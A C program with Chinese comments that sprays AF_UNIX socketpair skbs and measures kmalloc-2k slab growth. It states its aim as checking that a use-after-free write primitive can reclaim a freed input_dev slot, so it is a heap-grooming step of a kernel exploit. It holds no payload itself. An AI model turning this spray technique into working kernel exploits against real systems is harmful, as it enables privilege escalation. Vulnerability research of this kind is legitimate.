/*
 * skb 回收能力探测（纯 slab 观测，不含 UAF，零 panic 风险）
 *
 * 目的：验证 socketpair 发送的 skb 能否占用 kmalloc-2k
 *       （这是 99491 写原语回收 input_dev 槽位的前提）
 *
 * 步骤：
 *   1. 读 /proc/slabinfo kmalloc-2k 基线
 *   2. 开 N 对 socketpair，每对 send M 次 1400 字节
 *   3. 读喷射后 slab
 *   4. 全部关闭，读恢复后 slab
 *
 * 判据：喷射后 active 显著上升 => skb 占用 kmalloc-2k 成立
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>

struct slab { unsigned long obj, active, slabs; };

static int read_2k(struct slab *s) {
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[512];
    if (!f) { perror("slabinfo"); return -1; }
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "kmalloc-2k ", 11) == 0) {
            unsigned long a, b, c;
            char name[64];
            /* name active num_objs objsize objperslab pagesperslab : tunables ... : slabdata active_slabs num_slabs sharedfactor */
            int n = sscanf(line, "%63s %lu %lu %lu %*u %*u %*u %*u %*u %*u %*u %*u %*u %lu %lu",
                           name, &a, &b, &c, &s->active, &s->slabs);
            s->obj = b;
            (void)n; (void)c;
            fclose(f);
            return 0;
        }
    }
    fclose(f);
    return -1;
}

static void show(const char *tag, struct slab *s) {
    printf("  %-10s obj=%-7lu active=%-7lu slabs=%lu\n", tag, s->obj, s->active, s->slabs);
}

#define NPAIR 300
#define PERSEND 6
#define PAYLOAD 1400

int main(int argc, char **argv) {
    int npair = NPAIR;
    int persend = PERSEND;
    int payload = PAYLOAD;
    if (argc > 1) npair = atoi(argv[1]);
    if (argc > 2) persend = atoi(argv[2]);
    if (argc > 3) payload = atoi(argv[3]);

    printf("=== skb 回收能力探测 ===\n");
    printf("npair=%d persend=%d payload=%d\n\n", npair, persend, payload);

    struct slab base, during, during2, after;
    if (read_2k(&base) < 0) return 2;
    printf("=== kmalloc-2k 基线 ===\n");
    show("base", &base);

    char *buf = malloc(payload);
    memset(buf, 'A', payload);

    int (*pairs)[2] = calloc(npair, sizeof(int[2]));
    if (!pairs) return 3;

    printf("\n=== 喷射 %d 对 socket, 每对 send %d 次 (%dB) ===\n", npair, persend, payload);
    int okp = 0;
    for (int i = 0; i < npair; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, pairs[i]) < 0) {
            pairs[i][0] = pairs[i][1] = -1;
            continue;
        }
        int sndbuf = 1 << 20;
        setsockopt(pairs[i][0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        setsockopt(pairs[i][1], SOL_SOCKET, SO_RCVBUF, &sndbuf, sizeof(sndbuf));
        for (int j = 0; j < persend; j++) {
            ssize_t r = send(pairs[i][0], buf, payload, MSG_DONTWAIT);
            if (r < 0) break;
        }
        okp++;
    }
    printf("  建立 %d 对\n", okp);
    usleep(400000);

    if (read_2k(&during) < 0) return 2;
    show("during", &during);
    long d_obj = (long)during.obj - (long)base.obj;
    long d_act = (long)during.active - (long)base.active;
    printf("  delta obj=%+ld active=%+ld\n", d_obj, d_act);

    /* 第二轮 */
    printf("\n=== 再喷 %d 对 ===\n", npair);
    int (*pairs2)[2] = calloc(npair, sizeof(int[2]));
    int okp2 = 0;
    if (pairs2) {
        for (int i = 0; i < npair; i++) {
            if (socketpair(AF_UNIX, SOCK_STREAM, 0, pairs2[i]) < 0) {
                pairs2[i][0] = pairs2[i][1] = -1;
                continue;
            }
            int sndbuf = 1 << 20;
            setsockopt(pairs2[i][0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
            setsockopt(pairs2[i][1], SOL_SOCKET, SO_RCVBUF, &sndbuf, sizeof(sndbuf));
            for (int j = 0; j < persend; j++) {
                if (send(pairs2[i][0], buf, payload, MSG_DONTWAIT) < 0) break;
            }
            okp2++;
        }
    }
    printf("  建立 %d 对\n", okp2);
    usleep(400000);
    if (read_2k(&during2) < 0) return 2;
    show("during2", &during2);
    printf("  delta from base: obj=%+ld active=%+ld\n",
           (long)during2.obj - (long)base.obj,
           (long)during2.active - (long)base.active);

    /* 释放 */
    printf("\n=== 全部释放 ===\n");
    for (int i = 0; i < npair; i++) {
        if (pairs[i][0] >= 0) { close(pairs[i][0]); close(pairs[i][1]); }
        if (pairs2 && pairs2[i][0] >= 0) { close(pairs2[i][0]); close(pairs2[i][1]); }
    }
    free(pairs); free(pairs2);
    usleep(800000);
    if (read_2k(&after) < 0) return 2;
    show("after", &after);
    printf("  delta from base: obj=%+ld active=%+ld\n",
           (long)after.obj - (long)base.obj,
           (long)after.active - (long)base.active);

    printf("\n=== 结论 ===\n");
    long best = d_act > ((long)during2.active - (long)base.active)
              ? d_act : ((long)during2.active - (long)base.active);
    if (best > 100) {
        printf("  PASS: skb 大量占用 kmalloc-2k (active +%ld)\n", best);
        printf("  => 回收 input_dev 槽位技术上可行\n");
    } else if (best > 0) {
        printf("  WARN: 增量偏小 (active +%ld)，需调 payload 或载体\n", best);
    } else {
        printf("  FAIL: 未见增长，skb 可能不进 kmalloc-2k\n");
    }
    free(buf);
    return 0;
}